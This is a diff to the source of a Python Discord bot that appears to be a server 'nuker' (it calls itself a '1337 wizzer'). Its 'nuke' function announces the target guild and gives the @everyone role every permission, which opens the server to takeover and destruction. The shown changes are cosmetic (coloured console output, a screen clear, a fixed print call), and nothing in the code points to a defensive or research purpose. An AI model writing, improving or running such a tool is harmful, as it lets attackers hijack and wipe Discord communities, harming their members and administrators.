@@ -11,6 +11,8 @@ from colorama import Fore as C
 from time import sleep
 from discord_webhook import DiscordWebhook, DiscordEmbed
 
+os.system('cls')
+
 with open('config.json') as f:
     conf = json.load(f)
     BOT_TOKEN = conf.get('BOT_TOKEN')
@@ -31,7 +33,7 @@ async def status_task():
         await asyncio.sleep(60)
 
 async def nuke(guild):
-  print(f"{C.WHITE}Nuking {guild.name} ~ Using 1337 wizzer.")
+  print(f"{C.GREEN}Nuking {C.WHITE}{guild.name} ~ {C.CYAN}Using 1337 wizzer.")
   role = discord.utils.get(guild.roles, name = "@everyone")
   try:
     await role.edit(permissions = discord.Permissions.all())
@@ -215,7 +217,7 @@ async def on_member_join(member):
 
 @bot.event
 async def on_command_error(error):
-  await print(C.RED + "[-] [ERROR] " + error + C.RESET)
+  print(C.RED + "[-] [ERROR] " + error + C.RESET)
 
 def _input():
         sleep(5)
